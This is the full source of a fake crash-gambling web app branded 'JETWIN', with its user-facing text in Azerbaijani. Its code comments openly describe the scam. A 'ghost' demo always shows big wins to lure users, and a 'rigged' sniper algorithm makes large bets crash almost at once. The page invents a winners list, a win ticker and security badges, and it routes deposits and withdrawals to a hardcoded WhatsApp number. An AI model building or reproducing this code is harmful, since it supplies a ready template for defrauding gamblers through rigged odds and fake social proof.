<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <title>JETWIN | LIFE CHANGER</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;900&family=Oswald:wght@500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        /* --- PSYCHOLOGY & LUXURY THEME --- */
        :root {
            --bg: #000000;
            --gold: #FFD700;
            --neon-blue: #00f2ff;
            --success: #00ff66;
            --danger: #ff0033;
            --panel: #111111;
        }

        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; user-select: none; }
        
        body {
            margin: 0; padding: 0; background: var(--bg); color: white;
            font-family: 'Montserrat', sans-serif; height: 100vh; overflow: hidden;
            display: flex; flex-direction: column;
        }

        /* --- 1. INTRO & REGISTRATION (The Hook) --- */
        #introLayer {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(rgba(0,0,0,0.9), rgba(0,0,0,0.9)), url('https://images.unsplash.com/photo-1565514020176-db8416ce59c3?q=80&w=1000&auto=format&fit=crop');
            background-size: cover; z-index: 9999;
            display: flex; flex-direction: column; justify-content: center; align-items: center;
            padding: 30px; text-align: center;
        }

        .hook-title {
            font-family: 'Oswald', sans-serif; font-size: 36px; color: var(--gold);
            text-transform: uppercase; margin-bottom: 10px; line-height: 1.2;
            text-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
        }

        .hook-sub { font-size: 14px; color: #ccc; margin-bottom: 30px; line-height: 1.6; }

        .reg-form { width: 100%; max-width: 350px; display: flex; flex-direction: column; gap: 15px; }
        
        .inp-field {
            padding: 18px; border-radius: 10px; border: 1px solid #333;
            background: rgba(255,255,255,0.1); color: white; font-size: 16px;
            font-family: 'Montserrat', sans-serif; outline: none; transition: 0.3s;
        }
        .inp-field:focus { border-color: var(--gold); background: rgba(255,255,255,0.2); }

        .btn-gold {
            background: linear-gradient(45deg, #FFD700, #DAA520);
            border: none; padding: 20px; border-radius: 10px;
            color: black; font-weight: 900; font-size: 18px; text-transform: uppercase;
            cursor: pointer; box-shadow: 0 0 30px rgba(255, 215, 0, 0.4);
            animation: pulse 2s infinite;
        }
        @keyframes pulse { 0% {transform: scale(1);} 50% {transform: scale(1.02);} 100% {transform: scale(1);} }

        /* --- 2. MAIN INTERFACE --- */
        .app-container { display: none; flex-direction: column; height: 100%; width: 100%; }

        /* HEADER */
        .header {
            height: 60px; background: #0a0a0a; border-bottom: 1px solid #222;
            display: flex; justify-content: space-between; align-items: center; padding: 0 20px;
        }
        .user-greet { font-size: 12px; color: #888; text-align: right; }
        .user-name { color: var(--gold); font-weight: bold; font-size: 14px; }
        
        /* NEWS TICKER */
        .ticker-wrap { background: #000; height: 25px; overflow: hidden; border-bottom: 1px solid #222; }
        .ticker { white-space: nowrap; animation: tick 20s linear infinite; font-size: 11px; padding-top: 4px; color: #aaa; }
        .t-win { color: var(--success); font-weight: bold; }
        @keyframes tick { 0% {transform: translateX(100%);} 100% {transform: translateX(-100%);} }

        /* GAME STAGE */
        .stage { flex: 1; position: relative; overflow: hidden; background: radial-gradient(circle, #1a1a1a 0%, #000 100%); }
        canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
        
        .multiplier {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            font-size: 70px; font-weight: 900; color: white;
            text-shadow: 0 0 20px var(--neon-blue); font-family: 'Oswald', sans-serif;
        }

        /* HALL OF FAME BUTTON */
        .hof-btn {
            position: absolute; top: 10px; left: 10px;
            background: rgba(255, 215, 0, 0.1); border: 1px solid var(--gold);
            padding: 8px 15px; border-radius: 20px; color: var(--gold); font-size: 11px; font-weight: bold;
            cursor: pointer; z-index: 20; display: flex; align-items: center; gap: 5px;
        }

        /* CONTROLS */
        .controls { background: var(--panel); padding: 20px; border-top: 1px solid #222; }
        .bet-input { width: 100%; padding: 15px; background: #000; border: 1px solid #333; color: white; text-align: center; font-size: 24px; font-weight: bold; border-radius: 10px; margin-bottom: 15px; }
        
        .play-btn { width: 100%; height: 60px; border-radius: 12px; font-size: 22px; font-weight: 900; border: none; cursor: pointer; text-transform: uppercase; }
        .green { background: linear-gradient(45deg, #00c853, #009624); color: white; }
        .orange { background: linear-gradient(45deg, #ffab00, #ff6f00); color: black; display: none; }

        /* FOOTER MENU */
        .footer { height: 70px; background: #050505; display: flex; border-top: 1px solid #222; }
        .f-item { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; color: #555; font-size: 10px; cursor: pointer; }
        .f-item i { font-size: 20px; margin-bottom: 5px; }
        .f-active { color: var(--gold); }

        /* MODALS */
        .modal { position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.9); z-index: 1000; display: none; justify-content: center; align-items: center; }
        .modal-box { background: #111; padding: 20px; border-radius: 15px; border: 1px solid var(--gold); width: 90%; max-width: 400px; max-height: 80vh; overflow-y: auto; text-align: center; }
        .list-item { display: flex; justify-content: space-between; padding: 10px; border-bottom: 1px solid #222; font-size: 13px; }
        .rank { color: var(--gold); font-weight: bold; margin-right: 10px; }

    </style>
</head>
<body>

    <div id="introLayer">
        <h1 class="hook-title">UNLOCK YOUR<br>DREAM LIFE</h1>
        <p class="hook-sub">
            Maliyy…ô azadlƒ±ƒüƒ± bir addƒ±m uzaqdadƒ±r. <br>
            Qapalƒ± kluba daxil ol v…ô qazanmaƒüa ba≈üla.
        </p>
        
        <div class="reg-form">
            <input type="text" id="regName" class="inp-field" placeholder="Adƒ±nƒ±z v…ô Soyadƒ±nƒ±z" required>
            <input type="email" id="regEmail" class="inp-field" placeholder="Email √únvanƒ±nƒ±z" required>
            <button class="btn-gold" onclick="registerUser()">üöÄ ƒ∞NDƒ∞ QAZANMAƒûA BA≈ûLA</button>
        </div>
        <p style="font-size:10px; color:#555; margin-top:15px;">üîí 256-bit Secure Connection. 11,402 istifad…ô√ßi bu g√ºn qazandƒ±.</p>
    </div>

    <div class="app-container" id="app">
        
        <div class="ticker-wrap">
            <div class="ticker" id="tickerContent">
                </div>
        </div>

        <div class="header">
            <div style="font-weight:900; color:white; font-size:20px;">JETWIN <span style="color:var(--gold)">VIP</span></div>
            <div class="user-greet">
                Xo≈ü g…ôldin,<br>
                <span class="user-name" id="displayUser">User</span>
            </div>
        </div>

        <div class="stage" id="stage">
            <canvas id="stars"></canvas>
            <canvas id="game"></canvas>
            <div class="multiplier" id="multi">1.00x</div>
            
            <div class="hof-btn" onclick="openHallOfFame()">
                <i class="fa-solid fa-trophy"></i> TOP WINNERS
            </div>
        </div>

        <div class="controls">
            <div style="display:flex; justify-content:space-between; margin-bottom:5px; color:#888; font-size:12px;">
                <span>Balance: <b style="color:white;">$<span id="bal">0.00</span></b></span>
                <span>Min Withdraw: $21</span>
            </div>
            
            <input type="number" id="betVal" class="bet-input" value="10">
            
            <button class="play-btn green" id="btnBet" onclick="play()">BET NOW</button>
            <button class="play-btn orange" id="btnCash" onclick="cashOut()">CASHOUT</button>
        </div>

        <div class="footer">
            <div class="f-item" onclick="openPromo()"><i class="fa-solid fa-ticket"></i>Promo</div>
            <div class="f-item f-active" onclick="wa('deposit')"><i class="fa-solid fa-wallet"></i>Deposit</div>
            <div class="f-item" onclick="checkWithdraw()"><i class="fa-solid fa-money-bill-transfer"></i>Withdraw</div>
            <div class="f-item" onclick="wa('support')"><i class="fa-solid fa-headset"></i>Support</div>
        </div>
    </div>

    <div class="modal" id="hofModal" onclick="this.style.display='none'">
        <div class="modal-box" onclick="event.stopPropagation()">
            <h2 style="color:var(--gold); margin-top:0;">üèÜ ALL TIME LEGENDS</h2>
            <p style="font-size:12px; color:#666;">Onlar risk etdi v…ô h…ôyatlarƒ±nƒ± d…ôyi≈üdi.</p>
            <div id="hofList">
                </div>
            <button class="btn-gold" style="margin-top:20px; padding:10px; width:100%; font-size:14px;" onclick="document.getElementById('hofModal').style.display='none'">M∆èN D∆è QAZANACAƒûAM</button>
        </div>
    </div>

    <script>
        // --- SETTINGS ---
        const API_URL = "https://script.google.com/macros/s/AKfycbwVB3R1y84yzEvyFWww3frQ4ze2HHz6fh_RKTGYcR9uBT7ApL2uHRZNtRq4wUO-0j23Tg/exec"; 
        const WA_NUMBER = "994507516137";
        const MIN_WITHDRAW = 21;

        // --- GLOBAL VARS ---
        let balance = 0.00;
        let totalDep = 0.00;
        let isPlaying = false;
        let currentBet = 0;
        let multi = 1.00;
        let crashPoint = 0;
        let startTime, animFrame;
        
        // --- 1. REGISTRATION LOGIC ---
        // Check if already registered
        if(localStorage.getItem('jw_user_name')) {
            document.getElementById('introLayer').style.display = 'none';
            document.getElementById('app').style.display = 'flex';
            document.getElementById('displayUser').innerText = localStorage.getItem('jw_user_name');
            initGame();
        }

        function registerUser() {
            let name = document.getElementById('regName').value;
            let email = document.getElementById('regEmail').value;
            
            if(name.length < 2 || !email.includes('@')) {
                alert("Z…ôhm…ôt olmasa d√ºzg√ºn m…ôlumat daxil edin.");
                return;
            }

            // Save & Enter
            localStorage.setItem('jw_user_name', name);
            document.getElementById('displayUser').innerText = name;
            
            // Effect
            document.querySelector('.hook-title').innerText = "SUCCESS!";
            document.querySelector('.hook-sub').innerText = "Hesabƒ±nƒ±z yaradƒ±ldƒ±. ƒ∞ndi ba≈ülayƒ±n.";
            setTimeout(() => {
                document.getElementById('introLayer').style.opacity = '0';
                setTimeout(() => {
                    document.getElementById('introLayer').style.display = 'none';
                    document.getElementById('app').style.display = 'flex';
                    initGame();
                    alert(`Xo≈ü g…ôldin, ${name}! \nS…ônin √º√ß√ºn x√ºsusi ≈üanslar aktivl…ô≈üdirildi.`);
                }, 500);
            }, 1000);
        }

        // --- 2. GAME LOGIC ---
        const cvs = document.getElementById('game');
        const ctx = cvs.getContext('2d');
        let w, h;
        
        function initGame() {
            resize();
            drawStars();
            runGhost(); // Auto play for visuals
        }

        function resize() {
            w = cvs.width = document.getElementById('stage').offsetWidth;
            h = cvs.height = document.getElementById('stage').offsetHeight;
        }

        // Ghost Mode (Visual Simulation)
        function runGhost() {
            if(isPlaying) return;
            multi = 1.00;
            // Ghost always shows BIG wins to lure user
            let r = Math.random();
            crashPoint = r < 0.3 ? 2.50 : (r < 0.7 ? 8.00 : 40.00); 
            startTime = Date.now();
            ghostLoop();
        }

        function ghostLoop() {
            if(isPlaying) return;
            let t = (Date.now() - startTime) / 1000;
            multi = 1.00 + (t*t*0.1);
            if(multi >= crashPoint) {
                document.getElementById('multi').style.color = "#ff0033";
                setTimeout(() => { 
                    document.getElementById('multi').style.color = "white"; 
                    runGhost(); 
                }, 2000);
                return;
            }
            document.getElementById('multi').innerText = multi.toFixed(2) + "x";
            draw(t, true); // True = Gray color
            requestAnimationFrame(ghostLoop);
        }

        function play() {
            let val = parseInt(document.getElementById('betVal').value);
            if(balance < val) return alert("Balans kifay…ôt etmir. Depozit edin!");
            
            balance -= val; currentBet = val; updateUI();
            
            isPlaying = true; // Stops Ghost
            multi = 1.00;
            document.getElementById('btnBet').style.display = 'none';
            document.getElementById('btnCash').style.display = 'block';
            
            // --- RIGGED ALGORITHM (Sniper) ---
            crashPoint = getRiggedPoint(val);
            
            startTime = Date.now();
            loop();
        }

        function getRiggedPoint(bet) {
            let r = Math.random();
            // High Bet (>50) -> Instant Kill
            if(bet >= 50) return 1.00 + Math.random() * 0.10;
            // Mid Bet -> Risky
            if(bet >= 20) return 1.10 + Math.random() * 0.60;
            // Low Bet -> Let them taste honey
            if(r < 0.5) return 2.00 + Math.random() * 3.00;
            return 1.20 + Math.random() * 0.50; 
        }

        function loop() {
            if(!isPlaying) return;
            let t = (Date.now() - startTime) / 1000;
            multi = 1.00 + (t*t*0.08);

            if(multi >= crashPoint) {
                crash(); return;
            }
            document.getElementById('multi').innerText = multi.toFixed(2) + "x";
            draw(t, false);
            animFrame = requestAnimationFrame(loop);
        }

        function draw(t, isGhost) {
            ctx.clearRect(0,0,w,h);
            let color = isGhost ? "#555" : "#00f2ff";
            let x = Math.min(w-30, t*80);
            let y = h - Math.min(h-50, (multi-1)*130);
            
            ctx.beginPath(); ctx.lineWidth=4; ctx.strokeStyle=color;
            ctx.moveTo(0, h); ctx.quadraticCurveTo(x/2, h, x, y); ctx.stroke();
            
            if(!isGhost) {
                ctx.shadowBlur=15; ctx.shadowColor=color; ctx.stroke(); ctx.shadowBlur=0;
            }
            ctx.font="24px Arial"; ctx.fillText("üöÄ", x-10, y-10);
        }

        function cashOut() {
            if(!isPlaying) return;
            isPlaying = false; cancelAnimationFrame(animFrame);
            let win = currentBet * multi;
            balance += win; updateUI();
            
            document.getElementById('multi').innerText = "WIN!";
            document.getElementById('multi').style.color = "#00ff66";
            reset();
        }

        function crash() {
            isPlaying = false; cancelAnimationFrame(animFrame);
            document.getElementById('multi').innerText = "CRASH";
            document.getElementById('multi').style.color = "#ff0033";
            reset();
        }

        function reset() {
            setTimeout(() => {
                document.getElementById('btnBet').style.display = 'block';
                document.getElementById('btnCash').style.display = 'none';
                document.getElementById('multi').style.color = "white";
                runGhost();
            }, 2000);
        }

        function updateUI() { document.getElementById('bal').innerText = balance.toFixed(2); }

        // --- 3. SOCIAL PROOF (Ticker & Hall of Fame) ---
        const winners = [
            {n:"üá∫üá∏ Mike T.", a:"$154,200"}, {n:"üá©üá™ Hans G.", a:"$98,500"},
            {n:"üá¨üáß Sarah J.", a:"$210,000"}, {n:"üá¶üá™ Ahmed K.", a:"$540,000"},
            {n:"üá´üá∑ Pierre L.", a:"$88,200"}, {n:"üáπüá∑ Burak Y.", a:"$112,000"}
        ];

        // Ticker
        let tHtml = "";
        for(let i=0; i<15; i++) {
            let w = winners[Math.floor(Math.random()*winners.length)];
            let amount = (Math.random()*500).toFixed(0);
            tHtml += `<span style="margin-right:20px;">${w.n.substring(0,4)}... <span class="t-win">+$${amount}</span></span>`;
        }
        document.getElementById('tickerContent').innerHTML = tHtml;

        // Hall of Fame
        function openHallOfFame() {
            let list = document.getElementById('hofList');
            list.innerHTML = "";
            winners.forEach((w, i) => {
                list.innerHTML += `
                    <div class="list-item">
                        <span><span class="rank">#${i+1}</span> ${w.n}</span>
                        <span style="color:#00ff66; font-weight:bold;">${w.a}</span>
                    </div>
                `;
            });
            document.getElementById('hofModal').style.display = 'flex';
        }

        // --- 4. BUTTONS & API ---
        async function openPromo() {
            let code = prompt("Promo Kodu Daxil Edin:");
            if(!code) return;
            try {
                let res = await fetch(`${API_URL}?code=${encodeURIComponent(code)}`);
                let data = await res.json();
                if(data.result === 'success') {
                    let amt = parseFloat(data.amount);
                    balance += amt; 
                    if(code.startsWith("DEP") || code.startsWith("VIP")) totalDep += amt;
                    updateUI();
                    alert(`‚úÖ Uƒüurlu! Balansa $${amt} …ôlav…ô olundu.`);
                } else alert("Yanlƒ±≈ü kod!");
            } catch(e) { alert("X…ôta ba≈ü verdi"); }
        }

        function checkWithdraw() {
            if(balance < MIN_WITHDRAW) return alert(`Minimum √ßƒ±xarƒ±≈ü: $${MIN_WITHDRAW}`);
            if(balance <= totalDep) return alert("Yalnƒ±z udduƒüunuz pulu √ß…ôk…ô bil…ôrsiniz!");
            wa('withdraw');
        }

        function wa(type) {
            let txt = type === 'deposit' ? "Salam, Depozit etm…ôk ist…ôyir…ôm." : "Salam, Pulu √ß…ôkm…ôk ist…ôyir…ôm ID: " + localStorage.getItem('jw_user_name');
            window.open(`https://wa.me/${WA_NUMBER}?text=${encodeURIComponent(txt)}`, '_blank');
        }

        // Star Background
        const starsCvs = document.getElementById('stars');
        const sCtx = starsCvs.getContext('2d');
        function drawStars() {
            sCtx.clearRect(0,0,w,h); sCtx.fillStyle = "rgba(255,255,255,0.3)";
            for(let i=0;i<50;i++) {
                sCtx.beginPath(); sCtx.arc(Math.random()*w, Math.random()*h, Math.random()*2, 0, 6.28); sCtx.fill();
            }
        }
    </script>
</body>
</html>   
